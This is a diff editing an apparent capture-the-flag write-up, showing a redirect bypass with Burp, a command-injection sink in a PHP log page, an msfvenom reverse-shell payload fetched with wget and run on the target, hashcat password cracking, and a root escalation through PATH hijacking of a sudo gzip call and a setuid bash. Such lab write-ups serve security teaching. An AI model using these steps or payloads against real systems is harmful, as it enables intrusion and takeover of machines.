@@ -38,11 +38,11 @@ config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
 logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
 ```
 
-lets go through these files now.
+let's go through these files now.
 
-so, when I do /accounts.php, it shows me a redirect that supposed to be protection mechanism for the website :\).
+so, when I do `/accounts.php`, it shows me a 302 redirect that is supposed to be protection mechanism for the website :\).
 
-So, lets open up burp and see if we can turn on the intercept and see if we can cheange the `302 FOUND` to `200 OK` and remove the Location header
+So, lets open up `Burp` and see if we can turn on the intercept and see if we can change the `302 FOUND` to `200 OK` and remove the Location header
 
 ![](../../.gitbook/assets/image%20%2811%29.png)
 
@@ -52,7 +52,7 @@ now, we got the following page,
 
 ![](../../.gitbook/assets/image%20%2814%29.png)
 
-using this page, we are able to create the account as user admin1., and once we do that and login, I'm able to look at a zip file that is on the page at /files.php
+using this page, we are able to create the account as user `admin1`., and once we do that and login, I'm able to look at a zip file that is on the page at `/files.php`, and we got the source code of the website here.
 
 ![](../../.gitbook/assets/image%20%283%29.png)
 
@@ -73,7 +73,7 @@ function connectDB(){
 ?>
 ```
 
-and this in logs.php, maybe we can inject something here
+and this in `logs.php`, maybe we can inject something here
 
 ```text
 $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
@@ -85,7 +85,7 @@ $filename = "out.log";
 
 so, looks like this above piece of code is where our entry point is, so lets try to confirm that if we have code execution on the remote server by pinging our self from the target machine and running a 
 
-sudo tcpdump -i tun0 icmp on the local machine
+`sudo tcpdump -i tun0 icmp` on the local machine
 
 ![](../../.gitbook/assets/image%20%2810%29.png)
 
@@ -93,27 +93,46 @@ if you see any response on your machine like below, that mostly means we have co
 
 ![](../../.gitbook/assets/image%20%281%29.png)
 
-so, after confirming that we have code execution, I've run through couple of payloads to get a reverse shell using bash oneliner and python as well, but no luck, so I've used the generated payload from msfvenom
+so, after confirming that we have code execution, I've run through couple of payloads to get a `reverse shell` using bash one-liner and `python` as well, but no luck, so I've used the generated payload from `msfvenom`
 
 ```text
 msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=4242 -f elf -o shell
 ```
 
-and once we generate this, we can just open up a http server on our local machine, and transfer the file to remote using wget and mark it as an executable chmod 777 /tmp/shell and run it
+and once we generate this, we can just open up a http server on our local machine, and transfer the file to remote using `wget` and mark it as an executable `chmod 777 /tmp/shell` and run it
 
 ![](../../.gitbook/assets/image%20%2815%29.png)
 
 once we do that, we get a reverse shell
 
-once we get a reverse shell, we can see that there is a sql server running on the machine, and if you remember, there is a password that we grabbed before for the sql service
+once we get a reverse shell, we can see that there is a `SQL` server running on the machine, and if you remember, there is a password that we grabbed before for the `SQL` service
 
 ![](../../.gitbook/assets/image%20%2813%29.png)
 
-not sure if we'll be able to crack this, but I do remember we got a password salt kind of thing from the code that we downloaded from the zip file we got once we're able to login into the site
+not sure if we'll be able to crack this
 
 ![](../../.gitbook/assets/image%20%2812%29.png)
 
-there we go, we got it. lets see if we can crack this, meanwhile in /var/backups I found some gz files, lets have a look at that before we go into cracking \(couldn't crack the password and not much in those gz files as well\), lets run linpeas
+there we go, we got it. let's see if we can crack this, meanwhile in `/var/backups` I found some `gz` files, lets have a look at that before we go into cracking \(not much in those `gz` files as well\)
+
+so, we're able to crack the password using `hashcat`, \(it took quite some time, unusual for a CTF\)
+
+![](../../.gitbook/assets/screenshot-2021-08-13-at-22.45.09.png)
+
+so, we can login into the box as `m4lwhere` user into this box, and its a pretty straight forward stuff after this to get `root`
+
+![](../../.gitbook/assets/screenshot-2021-08-13-at-23.36.48.png)
+
+and if we look closely, we don't see any env reset stuff going on when we run `sudo -l`, so its possible that if we export a `PATH` variable, we might be able to persist it when we run the sudo command.
+
+```text
+echo "chmod +s /bin/bash" >> ~/gzip
+export PATH=$HOME:$PATH
+```
+
+once we do this and run the sudo command, `setuid` is turned ON on our `bash` executable, and we can simply run `/bin/bash -p` to get a root shell, and if you want an full ssh shell, you can put your `id_rsa.pub` into the `/root/.ssh/authorized_keys` and we can login using ssh
+
+![](../../.gitbook/assets/screenshot-2021-08-13-at-23.44.01.png)
 
 
 
